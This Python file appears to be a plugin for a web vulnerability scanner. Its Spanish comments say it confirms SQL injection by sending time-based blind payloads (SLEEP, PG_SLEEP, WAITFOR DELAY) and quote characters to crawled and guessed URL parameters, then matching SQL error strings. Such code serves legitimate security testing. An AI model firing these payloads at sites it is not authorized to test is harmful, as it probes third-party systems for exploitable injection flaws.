#!/usr/bin/env python3
"""Plugin sqli_confirm: confirmador de SQLi para reducir falsos positivos.

Toma la superficie descubierta por el crawler (parametros y URLs) y aplica
tecnicas de confirmacion adicionales (error-based literales + time-based blind)
sobre los parametros sospechosos. Solo emite con confidence='confirmed' cuando
hay correlacion clara (diferencia de tiempo >2.5s o error SQL real).

NO usa shell; toda red va por core.http via ctx.req.
"""
import time

SQLI_ERRORS = ["error in your sql", "sql syntax", "sqlite", "you have an error",
               "unclosed quotation mark", "sqlstate", "ora-", "pg_", "warning: mysqli",
               "microsoft sql server", "syntax error", "near \"", "unrecognized token",
               "operationalerror", "database error", "could not", "sql command not properly ended",
               "you have an error in your sql syntax"]

# time-based blind (MySQL SLEEP / Postgres PG_SLEEP / MSSQL WAITFOR)
TIME_PAYLOADS = [
    "1' AND SLEEP(3)-- -",
    "1\" AND SLEEP(3)-- -",
    "1) AND SLEEP(3)-- -",
    "1' AND PG_SLEEP(3)-- -",
    "1 WAITFOR DELAY '0:0:3'-- -",
]

SQLI_PATHS = ["", "/listproducts.php", "/product.php", "/products.php",
               "/artists.php", "/artist.php", "/item.php", "/view.php",
               "/news.php", "/article.php", "/post.php", "/doc", "/note",
               "/search", "/category", "/cat", "/show", "/detail", "/books"]
SQLI_PARAMS = ["id", "cat", "q", "page", "search", "note", "category",
               "pid", "uid", "user", "item", "product", "artist", "idp",
               "cid", "bid", "aid"]


def _build_surface(ctx):
    targets = []
    seen = set()

    def add(url_base, param):
        key = (url_base.rstrip("/"), param)
        if key not in seen:
            seen.add(key)
            targets.append((url_base, param))

    crawl = getattr(ctx, "_crawl", {}) or {}
    for f in (crawl.get("forms") or []):
        if (f.get("method") or "GET").upper() == "GET":
            act = f.get("action") or ctx.target
            for p in (f.get("params") or []):
                add(act, p)
    crawled_urls = sorted(crawl.get("urls") or set())
    for p in (crawl.get("params") or set()):
        p = str(p)
        if p:
            add(ctx.target, p)
            for u in crawled_urls:
                if u.startswith(ctx.target.rstrip("/")):
                    add(u.split("?")[0], p)
    for sp in SQLI_PATHS:
        base_url = ctx.target.rstrip("/") + sp
        for param in SQLI_PARAMS:
            add(base_url, param)
    return targets


def run(ctx):
    from engine import confirm_sqli_boolean

    targets = _build_surface(ctx)
    confirmed = []
    for base_url, param in targets:
        if ctx.ctrl("sqli_confirm") in ("stop", "skip"):
            break
        # 1) time-based blind
        t0 = time.time()
        r = ctx.req("GET", base_url, {param: TIME_PAYLOADS[0]}, timeout=8)
        dt = time.time() - t0
        if not r.get("err") and dt >= 2.5:
            confirmed.append((base_url, param, f"time-based SLEEP ({dt:.1f}s)"))
            continue
        # 2) error SQL literal (tecnicas adicionales al plugin sqli base)
        for p in ["'", "\"", "')", "1'"]:
            if ctx.ctrl("sqli_confirm") in ("stop", "skip"):
                break
            rr = ctx.req("GET", base_url, {param: p})
            if any(s in (rr.get("body", "") or "").lower() for s in SQLI_ERRORS):
                confirmed.append((base_url, param, f"error SQL literal con payload '{p}'"))
                break
    for base_url, param, detail in confirmed:
        ctx.emit({"type": "finding", "severity": "high", "module": "sqli_confirm",
                  "confidence": "confirmed",
                  "detail": f"SQLi CONFIRMADA (sqli_confirm) en '{param}' ({base_url}): {detail}",
                  "evidence": {"url": base_url, "param": param}})
    ctx.emit({"type": "module", "name": "sqli_confirm", "status": "done",
              "msg": f"sqli_confirm: {len(confirmed)} confirmada(s) adicionales",
              "findings": [f"{u} {p}" for u, p, _ in confirmed]})
